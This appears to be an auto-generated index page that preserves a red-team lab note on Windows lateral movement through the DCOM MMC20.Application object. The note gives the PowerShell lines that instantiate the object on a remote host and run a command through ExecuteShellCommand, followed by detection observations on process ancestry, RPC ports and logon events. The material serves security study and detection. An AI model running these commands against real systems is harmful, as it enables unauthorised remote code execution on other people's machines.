---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Lateral Movement via DCOM

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-lateral-movement-t1175-distributed-component-object-model` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/t1175-distributed-component-object-model.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Lateral Movement via DCOM](../../topics/offensive-security/lateral-movement-via-dcom.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-lateral-movement-t1175-distributed-component-object-model |
| name | Lateral Movement via DCOM |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/lateral-movement/t1175-distributed-component-object-model.md |

## Preserved Source Material

````yaml
_asset_filenames:
- dcom-ancestry+connections.png
- dcom-connection2.png
- dcom-listening.png
- dcom-logon-event.png
- dcom-mmc-bind.png
- dcom-rce (1).png
- dcom-registry.png
- dcom-registry2.png
_body: '---

  description: Lateral Movement via Distributed Component Object Model

  ---


  # Lateral Movement via DCOM


  > The Microsoft Component Object Model (COM) is a platform-independent, distributed, object-oriented system for creating
  binary software components that can interact. COM is the foundation technology for Microsoft''s OLE (compound documents),
  ActiveX (Internet-enabled components), as well as others.

  >

  > [https://docs.microsoft.com/en-us/windows/desktop/com/the-component-object-model](https://docs.microsoft.com/en-us/windows/desktop/com/the-component-object-model)


  This lab explores a DCOM lateral movement technique using MMC20.Application COM as originally researched by @enigma0x3 in
  his blog post [Lateral Movement using the mmc20.application Com Object](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)


  ## Execution


  MMC20.Application COM class is stored in the registry as shown below:


  ![](../../.gitbook/assets/dcom-registry.png)


  Same can be achieved with powershell:


  ```csharp

  Get-ChildItem ''registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}''

  ```


  ![](../../.gitbook/assets/dcom-registry2.png)


  Establishing a connection to the victim host:


  {% code title="attacker@victim" %}

  ```csharp

  $a = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.0.0.2"))

  ```

  {% endcode %}


  Executing command on the victim system via DCOM object:


  {% code title="attacker@victim" %}

  ```csharp

  $a.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c hostname > c:\fromdcom.txt","7")

  ```

  {% endcode %}


  Below shows the command execution and the result of it - remote machine''s `hostname` command output is written to `c:\fromdcom.txt`:


  ![](<../../.gitbook/assets/dcom-rce (1).png>)


  ## Observations


  Once the connection from an attacker to victim is established using the below powershell:


  ```csharp

  [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.0.0.2"))

  ```


  This is what happens on the victim system - `svchost` spawns `mmc.exe` which opens a listening port via RPC binding:


  ![](../../.gitbook/assets/dcom-mmc-bind.png)


  ![](../../.gitbook/assets/dcom-listening.png)


  ![](../../.gitbook/assets/dcom-ancestry+connections.png)


  A network connection is logged from 10.0.0.7 (attacker) to 10.0.0.2 (victim) via `offense\administrator` (can be also seen
  from the above screenshot):


  ![](../../.gitbook/assets/dcom-logon-event.png)


  ![](../../.gitbook/assets/dcom-connection2.png)


  ## References


  {% embed url="https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/" %}


  {% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand" %}


  {% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.type.gettypefromclsid?view=netframework-4.7.2#System_Type_GetTypeFromCLSID_System_Guid_System_String_"
  %}


  {% embed url="https://docs.microsoft.com/en-us/windows/desktop/com/com-technical-overview" %}


  {% embed url="https://attack.mitre.org/wiki/Technique/T1175" %}'
_relative_path: offensive-security/lateral-movement/t1175-distributed-component-object-model.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/t1175-distributed-component-object-model.md
````
